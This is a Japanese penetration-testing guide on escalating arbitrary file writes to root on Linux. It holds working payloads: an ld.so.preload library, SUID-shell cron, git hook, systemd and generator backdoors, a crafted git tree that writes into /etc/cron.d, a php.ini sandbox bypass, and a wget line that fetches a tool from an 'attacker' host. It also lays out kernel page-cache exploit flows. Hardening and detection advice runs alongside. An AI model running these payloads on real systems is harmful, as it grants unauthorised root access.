# Rootへの任意ファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` は、dynamic linkerが他の共有オブジェクトより先に読み込む共有オブジェクトのシステム全体のリストです。Secure-execution modeではpreloadingに追加の制限が適用されるため、`/tmp/pe.so` のようなライブラリパスは、あらゆる状況で使えるSUID-binaryの手法ではありません。\
このファイルを作成または変更できる場合、このファイルを読み込むプロセスは、他の共有オブジェクトより先に指定されたライブラリを読み込みます。これにより、そのプロセスのコンテキストでコードを実行できます。<sup>[[12]](#references)</sup>

例: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** は、commit や merge 操作を含む、リポジトリ内のイベント時に実行される実行可能なスクリプトです。**特権を持つスクリプトまたはユーザー**がこれらの操作を実行し、攻撃者が **`.git` フォルダーに書き込み可能**な場合、hook を **権限昇格**に利用できます。<sup>[[13]](#references)</sup>

たとえば、git リポジトリの **`.git/hooks`** に **スクリプトを生成**すると、新しい commit が作成されるたびに実行されるようにできます。

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### 特権で動作する Git tree のエクスポートにおけるパストラバーサル

特権で動作する同期ツールは、checkout を行わず、攻撃者の影響を受けるリポジトリを `git ls-tree` で列挙し、各 blob を `git cat-file` で読み取り、報告されたパス名をステージングディレクトリに結合して、自ら書き込むことがあります。`-c safe.directory=*`（Git の異なる所有者のリポジトリに対する保護機能を無効化）を指定し、書き込み先がステージングディレクトリ内に収まるか確認しない場合、これは**同期ツールの権限での任意ファイル書き込み**につながります。tree エントリ名が絶対パスの場合、Python の `os.path.join(stage, name)` は `stage` を無視します。相対パスに `../` が含まれている場合は、ファイルシステムによるパス解決時に指定先から抜け出します。アプリケーションは Git に checkout させず、生の tree をファイルに展開するため、checkout 時のパス名拒否では書き込み先を保護できません。<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

root サービス、timer、デプロイエージェント、テンプレートインポーター、バックアップ／復元ジョブで、次のようなコード構造を探してください。<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

treeエントリは `<mode> SP <name> NUL <raw object ID>` としてエンコードされます。`git hash-object --literally` オプションを使うと、通常のパース処理や `git fsck` では拒否される可能性のあるオブジェクトデータを意図的に許可できるため、使い捨てのcloneで、ファイル名が絶対パスの宛先を指すtreeを作成できます。この例では、cronファイルのblobを作成し、細工したtreeをcommitでラップして、ブランチをそのcommitに移動します。ただし、悪用には、特権ジョブが利用するリポジトリを更新する権限と、不正なオブジェクトを受け入れるGitサーバーが必要です。<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardeningでは、repositoryの取り込みと最終的なfilesystem操作の両方を対象にする必要があります:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` を、サービスが信頼する必要のあるrepositoryだけに置き換え、可能な限りroot権限なしでrepository処理を実行します。
- materializationの前に、絶対パス名や、`.` または `..` のcomponentを含む名前を拒否します。結合後にcanonicalizeし、宛先が意図したrootの配下にあることを検証します。
- check-then-openによるsymlink raceを避けます。信頼できるdirectory descriptorを基準に相対パスで開き、Linuxでは攻撃者が制御するパスに対して `RESOLVE_BENEATH` と `RESOLVE_NO_SYMLINKS` を指定した `openat2()` を使用します。
- plumbingの出力からcheckoutを独自に再実装するより、隔離されたdirectory内で通常のcheckoutを行う方法を優先します。raw-objectの取り込みが必要な場合は、`receive.fsckObjects=true` などの受信側検証を有効にします。細工されたtreeを拒否するために必要な、パス名に関連する `receive.fsck.*` の検出結果を弱めてはいけません。

### 特権を伴う設定のデプロイ

一部の管理サービスは、意図するシステム状態を設定ファイルに保存し、後から高い権限でデプロイします。たとえば、[openmediavaultは設定を`/etc/openmediavault/config.xml`に保存します](https://docs.openmediavault.org/en/7.x/faq.html)。また、その[RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html)からサービスの変更を適用できます。権限の低いアカウントがこのファイルを書き換えたり置き換えたりできる場合、認可されたデプロイを要求することもできるか、また、選択されたmoduleが変更されたfieldをrootとして使用するかを確認してください。SSH account key、scheduled command、package installationにはそれぞれ異なる前提条件があります。ファイルが存在することやXMLファイルを書き込めることだけでは、いずれも証明できません。列挙中に設定を編集したりapply操作を実行したりせず、ファイルと親directoryの権限、呼び出し元のgroupとRPC認可、インストール済みversion、実際のconsumerを確認してください。

`/etc/fail2ban/action.d/` にあるFail2Banのaction定義も、特権を伴う設定境界です。このdirectoryへの書き込みと検索が可能なユーザーは、action定義を置き換えたりoverrideを追加したりできる可能性がありますが、directoryの権限だけではcode executionは証明できません。有効なjailが実際に影響を受けるactionを選択していること、Fail2Ban serviceがより高い権限でそのactionを実行すること、認可されたreload/restartの後に該当するban eventが発生することを確認してください。Fail2Banをrestartするsudo権限が別途あっても、正確なservice呼び出しに適用され、変更した定義が読み込まれる場合に限り関係します。[Fail2Banのaction設定](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5)にはaction-directoryとjailの関係が記載されています。また、[sample action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf)では、ban時に `actionban` がservice userの権限で実行されることが示されています。列挙中にactionを変更したりbanを発生させたりせず、権限と有効な設定を調べてください。

有効なFail2Ban jailがWHOIS情報を付加するmail actionを使用している場合は、別の境界も存在します。[CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm)では、信頼できないWHOISテキストがGNU mailutilsの `mail` にpipeされ、そのescape処理によってcommandが実行される可能性がありました。権限の低いfile writerが、**選択されているWHOIS client**のserver-override設定を変更できる場合、応答に影響を及ぼせる可能性があります。[Debianの`whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html)にはそのようなファイルの例が記載されていますが、パスや使用方法はインストール環境によって異なります。有効なjail/action、serviceの実行ユーザー、実際のWHOIS clientと設定ファイルのパス、mailの実装、応答を制御できるか、インストール済みのvendor fixまたはbackportを確認してください。WHOIS設定ファイルを書き込めること、Fail2Banのversion、またはmail actionだけでは、この一連の条件を証明できません。受動的な列挙中に外部serverへ問い合わせたりbanを発生させたりしないでください。

### TFTPによるファイル作成と特権を伴うpackage hook

アクセス可能なTFTP serviceは、**実効** tftpd-hpa設定でrootとして実行され、`--secure` directoryにfilesystem rootを指定し、`--create`を有効にしている場合、containerまたはローカルユーザーとの権限境界を越える可能性があります。[tftpd-hpaのmanual](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html)には、ファイル作成とユーザーに関するoptionが記載されています。これは、`/etc/apt/apt.conf.d/` など、特権を伴う設定directoryに新しいファイルを作成できる可能性を示します。ただし、既存ファイルは置き換えられないことがあります。[APTの設定manual](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html)には、`APT::Update::Pre-Invoke` commandが記載されています。rootで実行される `apt update` がより高い権限でのconsumerになり得るのは、新しい設定ファイルを読み込む場合に限られます。実行中のdaemonの実際の引数と実行ユーザー、ネットワーク到達性とfiltering、対象directoryでのファイル作成ポリシー、APTの実効設定範囲、後続の特権実行を確認してください。default設定、対象directoryへの書き込み権限、またはscheduled APT commandだけでは、経路全体の成立は証明できません。受動的なtriageでは、ファイルのuploadやAPTの実行をせず、ローカル設定とmetadataを範囲を限定して読み取ってください。

### Cronと時刻関連ファイル

rootが実行するcron関連ファイルに**書き込める**場合、そのjobが次に実行されたときに、通常はcode executionを得られます。注目すべき対象には次のものがあります:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- `/var/spool/cron/` または `/var/spool/cron/crontabs/` にあるroot自身のcrontab
- `systemd` timerと、それらが起動するservice

簡単な確認方法:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

典型的な悪用経路:

- `/etc/crontab` または `/etc/cron.d/` 内のファイルに **新しい root cron job を追加する**
- `run-parts` がすでに実行する **スクリプトを置き換える**
- 起動するスクリプトまたはバイナリを変更して **既存の timer target にバックドアを仕込む**

最小限の cron payload の例:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

`run-parts` が使用する cron ディレクトリ内にしか書き込めない場合は、代わりにそこへ実行可能ファイルを置きます:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notes:

- `run-parts` は通常、ドットを含むファイル名を無視するため、`backup.sh` ではなく `backup` のような名前を使ってください。<sup>[[15]](#references)</sup>
- 従来の cron の代わりに `systemd` timers を使うシステムもありますが、悪用の考え方は同じです。**root が後で実行するものを変更する**ことです。<sup>[[20]](#references)</sup>

### Service & Socket files

**`systemd` unit files** や、それらが参照するファイルに書き込める場合、unit を再読み込みして再起動するか、service/socket の activation path がトリガーされるのを待つことで、root として code execution を得られる可能性があります。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

ACL も含め、system unit directory 自体への書き込み権限と検索権限も確認してください。ユーザーは、ディレクトリの読み取りや一覧表示が拒否されていても、`/etc/systemd/system` に新しい unit を作成できる場合があります。ただし、そのパスに書き込めるだけでは何も起動しません。system manager が新しい unit を読み込むこと、その unit 名に対して呼び出し元が実効的に root 権限で `systemctl start` または `restart` を実行できる許可（あるいは別の特権 activation path）があること、そして service が意図した identity で実行されることを確認してください。ディスク上で変更した既存のロード済み unit には `daemon-reload` が必要な場合があります。一方、新しい名前の unit はロード時の動作が異なります。ワイルドカードを使った restart ルールで十分と判断する前に、sudo の引数と除外設定を正確に確認してください。[systemd unit search path](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) および [systemctl loading and reload semantics](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html) を参照してください。

確認対象として興味深いものは次のとおりです。

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 内の Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` が参照する service scripts/binaries
- root service が読み込む、書き込み可能な `EnvironmentFile=` のパス

簡易チェック:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

よくある悪用経路:

- **変更可能なroot所有のservice unit内の`ExecStart=`を上書きする**
- **悪意のある`ExecStart=`を含むdrop-in overrideを追加し、先に古い設定をクリアする**
- **unitがすでに参照しているスクリプトやバイナリにバックドアを仕込む**
- **ソケットが接続を受け取ったときに起動する対応する`.service`ファイルを変更し、socket-activated serviceを乗っ取る**

悪意のあるoverrideの例:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

一般的な有効化フロー：

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

サービスを自分で再起動できなくても、socket-activated unitを編集できるなら、クライアント接続を待つだけで、バックドア化したサービスをrootとして実行させられる場合があります。<sup>[[17]](#references)</sup>

### systemd generatorディレクトリ

**System generators**は、起動時と設定の再読み込み時に、system managerがunitファイルを読み込む前に起動する実行ファイルです。そのため、system-generatorディレクトリ（または既存の実行可能なgenerator）への書き込み権限は、見落としやすいrootコード実行の手段です。監査で`*.service`ファイルと`*.timer`ファイルしか確認しない場合は、特に注意が必要です。<sup>[[35]](#references)[[36]](#references)</sup>

通常の検索順は`/run/systemd/system-generators/`、`/etc/systemd/system-generators/`、`/usr/local/lib/systemd/system-generators/`、`/usr/lib/systemd/system-generators/`です（一部のディストリビューションでは、`/usr`への統合により`/lib/systemd/system-generators/`が公開されています）。同名の実行ファイルが先行するディレクトリにある場合、後続のものはシャドウされます。これらの**入力実行ファイルディレクトリ**と、generatorが生成した一時的なunit出力を格納する`/run/systemd/generator`、`/run/systemd/generator.early`、`/run/systemd/generator.late`を混同しないでください。<sup>[[35]](#references)</sup>

簡単な確認方法:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

新しく作成した generator には、実行ビットを設定する必要があります。write primitive で制御できるのがバイトのみで、mode を制御できない場合は、すでに実行可能な generator を標的にしてください。通常、既存ファイルをその場で切り詰めてもメタデータは保持されます。ディレクトリ自体に書き込み権限がある場合は、新しいエントリを作成し、実行可能に設定してください。<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

`systemctl daemon-reload` を **system** manager に対して実行するには適切な認可が必要ですが、実行するとすべての system generator が再実行されます。それ以外の場合は、特権ユーザーによる reload、パッケージ操作、または再起動を待ちます。`~/.config/systemd/user-generators/` などの user-generator ディレクトリは user manager の下で実行され、それだけでは root 権限を得られません。<sup>[[35]](#references)</sup>

hardening と hunting では、最終的な mode bits だけでなくすべてのパス構成要素と ACL を確認し、generator のハッシュとパッケージ所有権をベースライン化して、すべての system-generator 入力ディレクトリにおける作成、名前変更、内容変更、権限変更を検知できるようにしてください。書き込みの監視が重要です。one-shot generator は実行後に自身を削除することがあり、`/run/systemd/generator*` 以下の生成済み unit ツリーは次回の reload 時に再構築されるためです。<sup>[[35]](#references)[[36]](#references)</sup>

### 特権 PHP sandbox が使用する制限付き `php.ini` を上書きする

一部のカスタム daemon は、制限付き `php.ini`（例: `disable_functions=exec,system,...`）を指定して `php` を実行し、ユーザー提供の PHP を検証します。sandbox 内のコードが `file_put_contents` などの**書き込みプリミティブを1つでも**利用でき、daemon が使用する**正確な `php.ini` のパス**に到達できる場合、その**設定を上書き**して制限を解除し、その後に特権で実行される2つ目の payload を送信できます。<sup>[[2]](#references)</sup>

一般的な流れ:

1. 1つ目の payload で sandbox の設定ファイルを上書きする。
2. 危険な関数が再び有効になった状態で、2つ目の payload がコードを実行する。

最小限の例（daemon が使用するパスに置き換えてください）:

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

デーモンが root として実行される（または root 所有のパスを使って検証する）場合、2 回目の実行では root のコンテキストが得られます。これは、sandboxed runtime が引き続きファイルを書き込める場合に、**設定ファイルの上書きによる privilege escalation** が可能になることを意味します。

### binfmt_misc

`binfmt_misc` は `/proc/sys/fs/binfmt_misc` の下に登録情報を公開します。各登録情報は、ファイル形式のパターンとインタープリターを関連付けます。権限への影響は、誰が登録情報を変更できるか、また、その後どのプロセスが一致するファイルを実行するかによって異なります。そのため、これを privilege escalation の経路とみなす前に、これらの条件を確認してください。<sup>[[21]](#references)</sup>

`CAP_DAC_OVERRIDE` を持つ実行可能な helper が、呼び出し元が `/proc/sys/fs/binfmt_misc/register` に直接書き込めない場合でも、呼び出し元が制御するデータを受け取り、そこに書き込むなら、別の登録経路になり得ます。列挙中に helper を実行せず、その入力処理と書き込み動作を確認してください。登録ルールで `C` フラグが使われている場合、インタープリターには一致したバイナリに基づく資格情報が渡されます。そのため、root 所有の SUID バイナリに一致すると、呼び出し元が制御するインタープリターが root として実行される可能性があります。`binfmt_misc` のマウントと登録ポリシー、helper の実効 capability、正確なルールとインタープリターのパス、実行可能な SUID 対象、さらに `no_new_privs` や `nosuid` マウントが SUID による権限移行を抑止しないかを確認してください。capability ビットや埋め込まれたパス文字列だけでは、調査の手掛かりにすぎません。<sup>[[21]](#references)</sup> SUID の抑止条件については [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) を参照してください。

### スキーマハンドラー（http: や https: など）を上書きする

デスクトップ環境では、MIME 関連付けと desktop entry を使って URI スキームに対応するアプリケーションを選択します。ユーザー単位の関連設定や desktop entry のディレクトリに書き込める攻撃者は、それらのスキームを自分が制御する launcher にリダイレクトできます。`$HOME/.config/mimeapps.list` ファイルを変更して、HTTP と HTTPS の URL ハンドラーを悪意のあるファイル（例: `x-scheme-handler/http=evil.desktop` および `x-scheme-handler/https=evil.desktop`）に割り当てると、ユーザーのクリックによってその desktop entry が起動される可能性があります。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### root がユーザー書き込み可能なスクリプト/バイナリを実行する場合

特権ワークフローが `/bin/sh /home/username/.../script` のようなコマンド（または非特権ユーザーが所有するディレクトリ内のバイナリ）を実行する場合、乗っ取ることができます:<sup>[[1]](#references)</sup>

- **実行を検知する:** pspy でプロセスを監視し、root がユーザー制御下のパスを実行するのを検知します。<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **書き込み可能か確認:** 対象ファイルとそのディレクトリが、自分のユーザーの所有であり、書き込み可能であることを確認します。
- **対象を乗っ取る:** 元のバイナリ/スクリプトをバックアップし、SUID shellを作成するpayload（またはその他のroot権限での処理）を配置してから、権限を元に戻します。

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **privileged actionをトリガーする**（例: helperを起動するUIボタンを押す）。rootが乗っ取ったパスを再実行したら、`./rootshell -p`で昇格したshellを取得する。

### privileged binaryのpage-cache-onlyファイル変更

一部のkernel bugは、ファイルを**ディスク上で**変更しません。代わりに、読み取り可能なファイルの**page cacheコピー**だけを変更できます。**setuid**またはその他の方法で**rootが実行する**binaryを標的にできれば、ディスク上のファイルhashが変わらなくても、次回の実行時にmemory上の攻撃者が制御するbytesが実行され、privilegeを昇格できる可能性があります。<sup>[[3]](#references)[[4]](#references)</sup>

これは**runtime-only file write primitive**として捉えると便利です。<sup>[[3]](#references)</sup>

- **ディスク上はクリーンなまま**: inodeとディスク上のbytesは変化しない
- **memory上は汚染される**: キャッシュされたpageを読み取る/実行するprocessには、攻撃者が変更した内容が渡される
- **効果は一時的**: rebootまたはcache eviction後に変更は消える

このprimitiveは、従来の**arbitrary file write**と、Dirty COW / Dirty Pipeなどの古い**page-cache abuse** bugの中間に位置します。<sup>[[3]](#references)</sup>

- Dirty COWはraceに依存していた
- Dirty Pipeにはwrite位置の制約があった
- 脆弱な経路からキャッシュされたfile-backed pageに直接書き込める場合、page-cache-only primitiveのほうが信頼性が高い

#### Generic privesc flow

1. **file-backed page cache page**に書き込めるkernel primitiveを取得する
2. それを**読み取り可能なprivileged binary**またはrootが実行する別のファイルに対して使う
3. pageがcacheからevictされる**前に**実行をトリガーする
4. ディスク上のファイルが変更されていないように見える状態で、rootとしてcode executionを得る

一般的な高価値の標的:

- **setuid-root** binary
- **root service**が起動するhelper
- **host kernel/page cacheを共有するcontainer**から頻繁に実行されるbinary

#### AF_ALG + `splice()`の例

Copy Fail (CVE-2026-31431)は、このクラスの好例です。脆弱な経路はLinux crypto userspace API（`AF_ALG` / `algif_aead`）にありました。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`は、読み取り可能なファイルのpage-cache pageへの参照をcrypto TX scatterlistに移動できる
- in-placeの`algif_aead` decrypt経路は、sourceとdestinationのbufferを再利用していた
- `authencesn`はその後、destination tag領域に書き込んだ
- その領域がまだspliceされたfile-backed pageを参照している場合、書き込みは**標的ファイルのpage cache**に行われた

注目すべきtechniqueはCVEそのものではなく、次のパターンです。

- file-backed cache pageをkernel subsystemに**渡す**
- subsystemにそれを**書き込み可能な出力として扱わせる**
- memory上で小規模かつ制御されたoverwriteをトリガーする

公開PoCは、繰り返し**4-byte write**を行って`/usr/bin/su`をmemory上でpatchし、その後実行しました。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE cloneの例

DirtyClone (CVE-2026-43503)は、同じ**page-cache-only write-to-root**パターンの別の変種を示しています。ただし今回は、書き込み先は`AF_ALG`ではなく**IPsec ESP decrypt**です。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

重要なtechniqueは**metadata-launderingの手順**です。

- `splice()`が**読み取り専用のfile-backed page-cache page**をESP-in-UDP packetに配置する
- 元のDirtyFrag mitigationは、そのskbに`SKBFL_SHARED_FRAG`を設定し、`esp_input()`がdecrypt前に**コピーする**ようにしていた
- netfilter `TEE`が`nf_dup_ipv4()` -> `__pskb_copy_fclone()`を通じてpacketを複製する
- cloneは**同じ物理page-cache参照**を維持する一方で、`SKBFL_SHARED_FRAG`を失う
- その後、`esp_input()`はcloneを安全だと判断し、file-backed pageに対してin-placeの**`cbc(aes)` decrypt**を実行する

したがって、reviewerへの教訓はCVEの範囲を超えています。操作前にコピーが必要かどうかを**skb/page metadata**に基づいて判断するmitigationでは、backing pageを維持しながらmetadataを破棄する**clone/copy経路**によって、write primitiveが気づかれないまま再び有効になる可能性があります。

典型的なexploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`を使い、private network namespace内で**`CAP_NET_ADMIN`**を取得する
2. loopbackを有効にし、`mangle/OUTPUT`に**netfilter `TEE` rule**を設定する
3. `NETLINK_XFRM`経由で**XFRM ESP transport SA**を設定する
4. DirtyFragのword-selection trickを使い、標的の各4-byte wordをSAの`seq_hi` fieldにencodeする
5. spliceしたESP-in-UDP packetを送信し、**TEE clone**を`esp_input()`に到達させて**in-place**でdecryptする
6. `/usr/bin/su`または別のprivileged executableのpage-cacheコピーに攻撃者が制御するcodeが含まれるまで繰り返す

実運用上の影響は`AF_ALG`の例と同じです。ディスク上のファイルはクリーンなままですが、`execve()`が**変更されたpage-cache bytes**を実行し、root権限を得ます。<sup>[[8]](#references)[[9]](#references)</sup>

この変種の有用な露出確認:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

ここでの短期的な攻撃対象領域の縮小も、経路ごとに異なります。`48f6a5356a33` を含む kernel にアップグレードすると clone 経路が修正され、`xt_TEE` の autoload をブロックすると **flag-laundering step** が取り除かれ、`esp4` / `esp6` をブロックすると **decrypt sink** が取り除かれます。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### 露出状況の調査とハンティング

この種の bug が疑われる場合、ディスクの整合性チェックだけに頼らないでください。以下も確認してください：

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

以下の設定値は、loadable interface と kernel に組み込まれた interface を区別します。crypto の build rules では、`CONFIG_CRYPTO_USER_API_AEAD` が `algif_aead` に対応付けられています。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` は module として load/unload できる可能性があります
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface は kernel に組み込まれます
- setuid binaries は有効なターゲットです。page-cache-only patch だけで、local foothold を root に昇格させられる場合があるためです

#### `algif_aead` path の攻撃対象領域の縮小

脆弱な interface が loadable module によって提供されている場合:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

カーネルに組み込まれている場合、いくつかの情報漏えい事例では、次の方法で init パスをブロックできると報告されています：<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

この種の緩和策は、ほかの kernel LPE でも覚えておく価値があります。exploit が特定の optional interface に依存している場合、その interface を無効化または blacklist に登録すれば、kernel を完全に upgrade できるようになる前でも exploit の経路を断てることがあります。<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – ユーザーが書き込み可能な PaperCut ディレクトリ内の root 実行スクリプトを乗っ取る](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 に関する Openwall oss-security の開示](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable の修正: crypto: algif_aead - out-of-place 操作に戻す](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 アドバイザリ](https://copy.fail/)
- [7] [Theori / Xint の技術解説](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone リポジトリ / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE の亜種 DirtyClone (CVE-2026-43503) の解析と exploit](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux の修正: net: skb: `__pskb_copy_fclone()` で `SKBFL_SHARED_FRAG` を保持 (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux の以前の緩和策: splice された UDP パケットに `SKBFL_SHARED_FRAG` を設定 (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian マニュアルページ](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel ドキュメント](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME アプリケーションの関連付け](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info 仕様](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry 仕様](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig 言語](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache の脆弱性](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` ドキュメント](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` ドキュメント](https://git-scm.com/docs/git-ls-tree)
- [33] [Git 設定ドキュメント](https://git-scm.com/docs/git-config)
